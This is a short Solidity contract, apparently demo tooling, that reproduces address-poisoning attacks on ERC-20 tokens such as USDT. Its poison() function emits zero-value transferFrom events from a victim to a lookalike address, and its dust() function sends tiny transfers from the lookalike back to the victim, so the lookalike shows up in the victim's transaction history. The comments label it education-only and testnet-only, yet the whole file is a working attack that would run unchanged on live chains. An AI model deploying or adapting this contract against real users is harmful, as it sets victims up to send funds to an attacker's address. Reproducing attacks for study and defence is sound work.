// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title Poisoner — address-poisoning attack reproduction for EDUCATION ONLY
/// @notice DEMO / ATTACK-REPRODUCTION TOOLING. Local Anvil and testnet assets only.
/// This contract reproduces the two real-world techniques used to insert a
/// lookalike address into a victim's transaction history:
///
/// 1. poison(): a zero-value `transferFrom(victim, lookalike, 0)`. On vanilla
///    ERC-20s (including real USDT) this succeeds with zero allowance and emits
///    a Transfer event `victim -> lookalike`, so the victim's *outgoing* history
///    lists an attacker address they never sent anything to.
/// 2. dust(): a tiny real transfer `lookalike -> victim`, so the victim's
///    *incoming* history shows the lookalike.
///
/// Neither requires the victim's consent or keys — that is the entire problem.
contract Poisoner {
    /// @notice Zero-value transferFrom — needs no allowance on USDT-style tokens
    function poison(IERC20 token, address victim, address lookalike) external returns (bool) {
        return token.transferFrom(victim, lookalike, 0);
    }

    /// @notice Tiny real-value transfer so `victim`'s inbound history shows `lookalike`.
    /// @dev Caller must arrange `lookalike`'s allowance to this contract (in the demo the
    /// attacker controls the lookalike key and approves once).
    function dust(IERC20 token, address lookalike, address victim, uint256 amount) external {
        token.transferFrom(lookalike, victim, amount);
    }
}
